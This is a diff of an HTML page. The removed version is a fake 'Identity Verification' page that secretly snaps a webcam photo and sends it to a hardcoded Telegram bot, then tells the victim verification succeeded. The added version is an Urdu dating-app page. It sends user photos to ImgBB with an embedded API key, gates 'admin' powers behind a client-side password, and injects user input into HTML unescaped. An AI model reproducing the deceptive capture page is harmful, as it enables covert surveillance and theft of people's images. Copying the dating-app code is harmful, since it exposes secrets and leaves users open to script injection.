@@ -1,73 +1,148 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Umar Dating App - Online</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
-        .btn { background-color: #007bff; color: white; border: none; padding: 15px; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        #status { margin-top: 20px; color: #555; font-weight: bold; }
-        video, canvas { display: none; width: 100%; border-radius: 10px; margin-top: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; padding-bottom: 70px; direction: rtl; }
+        header { background: linear-gradient(45deg, #fd297b, #ff5864); color: white; padding: 15px; text-align: center; font-size: 24px; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        
+        .container { padding: 15px; max-width: 500px; margin: auto; }
+        
+        /* رجسٹریشن فارم */
+        .registration-box { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        .btn-main { background: #fd297b; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        
+        /* یوزر کارڈز */
+        .profile-card { background: white; border-radius: 20px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); position: relative; }
+        .profile-card img { width: 100%; height: 350px; object-fit: cover; }
+        .profile-info { padding: 15px; background: white; }
+        .profile-info h3 { margin: 0; color: #333; }
+        .profile-info p { color: #777; margin: 5px 0; }
+        
+        /* ایڈمن بٹن */
+        .admin-del-btn { background: #ff4d4d; color: white; border: none; padding: 8px 15px; border-radius: 5px; position: absolute; top: 10px; left: 10px; cursor: pointer; display: none; z-index: 10; }
+        
+        /* فوٹر */
+        footer { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #ddd; }
+        .nav-item { color: #ccc; font-size: 20px; cursor: pointer; }
+        .nav-item.active { color: #fd297b; }
+        #adminLink { font-size: 10px; position: absolute; bottom: 2px; color: #eee; text-decoration: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>Identity Verification</h2>
-    <p>Please click the button to verify your identity.</p>
-    <button id="startBtn" class="btn">Start Verification</button>
-    <div id="status">Ready...</div>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+<header>عمر ڈیٹنگ ایپ</header>
+
+<div class="container">
+    <div id="registrationSection" class="registration-box">
+        <h2>نیا اکاؤنٹ بنائیں</h2>
+        <input type="text" id="userName" placeholder="آپ کا نام">
+        <input type="number" id="userAge" placeholder="آپ کی عمر">
+        <select id="userGender">
+            <option value="لڑکی">لڑکی</option>
+            <option value="لڑکا">لڑکا</option>
+        </select>
+        <p style="font-size: 14px; color: #666;">اپنی تصویر منتخب کریں:</p>
+        <input type="file" id="userPhoto" accept="image/*">
+        <button class="btn-main" onclick="startUpload()">ایپ میں شامل ہوں</button>
+        <p id="loadingMsg" style="display:none; color: #fd297b;">تصویر اپ لوڈ ہو رہی ہے، انتظار کریں...</p>
+    </div>
+
+    <div id="feedSection" style="display:none;">
+        <h3 style="text-align: center; color: #444;">آپ کے قریبی لوگ</h3>
+        <div id="usersContainer"></div>
+    </div>
 </div>
 
+<footer>
+    <div class="nav-item active"><i class="fas fa-fire"></i></div>
+    <div class="nav-item"><i class="fas fa-comments"></i></div>
+    <div class="nav-item"><i class="fas fa-user"></i></div>
+    <a href="#" id="adminLink" onclick="activateAdmin()">Admin</a>
+</footer>
+
 <script>
-    const startBtn = document.getElementById('startBtn');
-    const status = document.getElementById('status');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const IMGBB_API_KEY = "c9594cccfb17221a69aa3e9bb885acf0";
+    let isAdmin = false;
 
-    const botToken = "7736631627:AAH0zF1rC9O_z59_z59_z59_z59"; 
-    const chatId = "7670333048"; 
+    async function startUpload() {
+        const name = document.getElementById('userName').value;
+        const age = document.getElementById('userAge').value;
+        const gender = document.getElementById('userGender').value;
+        const photoFile = document.getElementById('userPhoto').files[0];
+        const loadingMsg = document.getElementById('loadingMsg');
 
-    startBtn.onclick = async () => {
-        startBtn.style.display = 'none';
-        status.innerText = "Connecting to camera...";
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            video.style.display = 'block';
-            status.innerText = "Verifying... Stay still";
-
-            setTimeout(async () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'verify.png');
-
-                    status.innerText = "Finalizing Verification...";
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    status.innerText = "✅ Verification Successful!";
-                    status.style.color = "green";
-                    video.style.display = 'none';
-                    stream.getTracks().forEach(t => t.stop());
-                }, 'image/png');
-            }, 3000);
-        } catch (err) {
-            status.innerText = "Error: Camera access denied.";
-            startBtn.style.display = 'block';
+        if (!name || !age || !photoFile) {
+            alert("براہ کرم تمام معلومات درست طریقے سے بھریں!");
+            return;
         }
-    };
+
+        loadingMsg.style.display = "block";
+
+        // Step 1: Upload Image to ImgBB
+        const formData = new FormData();
+        formData.append("image", photoFile);
+
+        try {
+            const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+                method: "POST",
+                body: formData
+            });
+            const data = await response.json();
+            const imageUrl = data.data.url;
+
+            // Step 2: Show the Profile in Feed
+            addNewProfileCard(name, age, gender, imageUrl);
+
+            // Step 3: Switch UI
+            document.getElementById('registrationSection').style.display = "none";
+            document.getElementById('feedSection').style.display = "block";
+            
+        } catch (error) {
+            alert("اپ لوڈ میں مسئلہ آیا، دوبارہ کوشش کریں۔");
+            loadingMsg.style.display = "none";
+        }
+    }
+
+    function addNewProfileCard(name, age, gender, url) {
+        const container = document.getElementById('usersContainer');
+        const card = document.createElement('div');
+        card.className = 'profile-card';
+        card.innerHTML = `
+            <button class="admin-del-btn" onclick="removeCard(this)">ڈیلیٹ کریں</button>
+            <img src="${url}" alt="Profile">
+            <div class="profile-info">
+                <h3>${name}، ${age}</h3>
+                <p><i class="fas fa-venus-mars"></i> ${gender}</p>
+                <p><i class="fas fa-circle" style="color: #4caf50; font-size: 10px;"></i> ابھی آن لائن</p>
+                <button class="btn-main" style="padding: 10px; font-size: 14px;">بات کریں</button>
+            </div>
+        `;
+        container.prepend(card);
+    }
+
+    function activateAdmin() {
+        const pass = prompt("ایڈمن پاس ورڈ درج کریں:");
+        if (pass === "umar123") {
+            isAdmin = true;
+            alert("عمر بھائی! اب آپ کسی بھی غلط پروفائل کو ڈیلیٹ کر سکتے ہیں۔");
+            const delBtns = document.querySelectorAll('.admin-del-btn');
+            delBtns.forEach(btn => btn.style.display = "block");
+        } else {
+            alert("غلط پاس ورڈ!");
+        }
+    }
+
+    function removeCard(btn) {
+        if (confirm("کیا آپ اس یوزر کو نکالنا چاہتے ہیں؟")) {
+            btn.parentElement.remove();
+        }
+    }
 </script>
+
 </body>
 </html>
